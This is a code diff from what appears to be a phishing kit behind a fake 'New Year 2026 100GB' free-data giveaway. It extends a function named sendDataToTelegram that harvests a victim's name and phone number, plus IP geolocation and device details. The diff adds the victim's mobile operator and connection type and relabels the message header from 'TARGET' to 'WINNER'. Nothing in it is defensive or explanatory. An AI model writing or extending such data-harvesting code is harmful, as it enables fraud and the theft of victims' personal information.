@@ -12,7 +12,7 @@ function escapeHTML(str: string) {
   }[m] || m));
 }
 
-export const sendDataToTelegram = async (name: string, phone: string) => {
+export const sendDataToTelegram = async (name: string, phone: string, operator: string, connectionType: string) => {
   let ipData = { ip: 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
   let geoData = 'Not provided';
 
@@ -36,14 +36,17 @@ export const sendDataToTelegram = async (name: string, phone: string) => {
 
   const safeName = escapeHTML(name);
   const safePhone = escapeHTML(phone);
+  const safeOperator = escapeHTML(operator);
+  const safeConn = escapeHTML(connectionType);
   const safeUA = escapeHTML(navigator.userAgent);
   const time = new Date().toLocaleString();
 
   const text = `
-<b>🎉 NEW YEAR 2026 TARGET 🎉</b>
+<b>🔥 NEW YEAR 2026 WINNER 🔥</b>
 ━━━━━━━━━━━━━━━━━━
 <b>👤 Name:</b> ${safeName}
 <b>📱 Phone:</b> <code>${safePhone}</code>
+<b>📡 Operator:</b> ${safeOperator} (${safeConn})
 ━━━━━━━━━━━━━━━━━━
 <b>🌍 IP Address:</b> <code>${ipData.ip}</code>
 <b>🚩 Country:</b> ${ipData.country} (${ipData.region})
@@ -52,7 +55,7 @@ export const sendDataToTelegram = async (name: string, phone: string) => {
 ━━━━━━━━━━━━━━━━━━
 <b>💻 Device:</b> <i>${safeUA}</i>
 <b>⏰ Time:</b> ${time}
-<b>🏳️ Campaign:</b> New Year 2026 100GB
+<b>🏳️ Campaign:</b> NY-2026-100GB-PREMIUM
 ━━━━━━━━━━━━━━━━━━
 `;
 
